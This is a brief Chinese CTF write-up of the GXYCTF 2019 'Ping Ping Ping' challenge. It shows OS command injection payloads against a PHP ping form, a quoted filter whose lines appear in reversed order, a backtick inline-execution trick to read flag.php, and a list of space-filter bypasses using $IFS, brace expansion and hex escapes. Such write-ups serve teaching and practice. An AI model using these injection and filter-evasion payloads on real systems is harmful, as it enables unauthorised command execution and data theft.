#RCE

![Pasted image 20230507102601.png](../../.image/Pasted%20image%2020230507102601.png)
框中输入东西后发现是链接中多了 /?ip=

尝试

```url
?ip=127.0.0.1;ls
```

发现有`flag.php`和`index.php`

过滤了空格，先查看一下 `index.php`

```url
/?ip=127.0.0.1;tac$IFS$9index.php
```

发现过滤

```php
$a = shell_exec("ping -c 4 ".$ip);
		}
			die("fxck your flag!");
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
		}
			die("fxck your bash!");
		else if(preg_match("/bash/", $ip)){
		}
			die("fxck your space!");
		else if(preg_match("/ /", $ip)){
		}
			die("fxck your symbol!");
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			print($ip);
			print_r($match);
		if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
```

利用内联执行查看`flag.php`

```
/?ip=127.0.0.1;tac$IFS$9`ls`
```

##### 绕过空格

```sh
{cat,flag.txt}
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat$IFS$1flag.txt
cat<flag.txt
%09替换
cat<>flag.txt
kg=$'\x20flag.txt'&&cat$kg
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)
```

[[GXYCTF 2019]Ping Ping Ping_XiLitter 的博客-CSDN 博客](https://blog.csdn.net/m0_62422842/article/details/124616206)
